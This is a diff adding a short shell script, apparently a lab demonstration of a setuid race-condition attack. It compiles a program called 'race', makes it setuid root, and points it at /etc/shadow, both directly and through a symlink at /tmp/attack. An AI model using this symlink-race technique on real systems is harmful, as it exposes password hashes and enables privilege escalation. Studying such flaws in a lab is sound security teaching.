@@ -1,0 +1,12 @@
+g++ -o race race.cpp -g
+sudo chgrp root race
+sudo chown root race
+sudo chmod +s race
+ls
+cat /etc/shadow
+echo "./race /etc/shadow"
+./race /etc/shadow
+echo "ln -s /etc/shadow /tmp/attack"
+ln -s /etc/shadow /tmp/attack
+echo "./race /tmp/attack"
+./race /tmp/attack
